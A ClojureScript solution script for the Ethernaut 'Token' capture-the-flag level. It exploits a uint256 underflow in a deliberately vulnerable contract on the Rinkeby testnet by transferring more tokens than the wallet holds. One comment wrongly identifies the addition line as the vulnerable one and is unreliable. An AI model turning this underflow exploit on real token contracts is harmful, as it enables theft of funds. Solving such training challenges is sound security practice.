(ns ctf.ethernaut.token
  (:require [ctf.ethernaut.wallets :as w]
            [ctf.ethernaut.utils :as u]))



(def token-rinkeby
  "0xF424689F9B8c48BF402B32519f8B750Bc9960edB") ; <-- Token Contract addr on rinkeby

(comment

  (do

    ;; Get an instance of the deployed contract.
    (def token
      (u/get-contract! token-rinkeby
                       (u/abi "/Token.sol/Token.json")
                       w/rinkeby-wallet))

    ;; The main idea behind this contract is integer underflow
    ;; This line from the contract is the vulnerable line
    ;;
    ;; balances[_to] += _value;
    ;;
    ;; balances map has address->uint256
    ;; the smallest value for unsigned integer is 0
    ;; on decreasing the value further it will underflow
    ;; to the highest uint256 value.
    (-> (.transfer token
                   (.-address token)
                   21
                   (js-obj "gasLimit" 2000000))
        (.then #(.wait % 3))
        (.then #(.balanceOf token (.-address w/rinkeby-wallet)))
        (.then #(.log js/console %))
        (.catch #(.log js/console %))))


  )
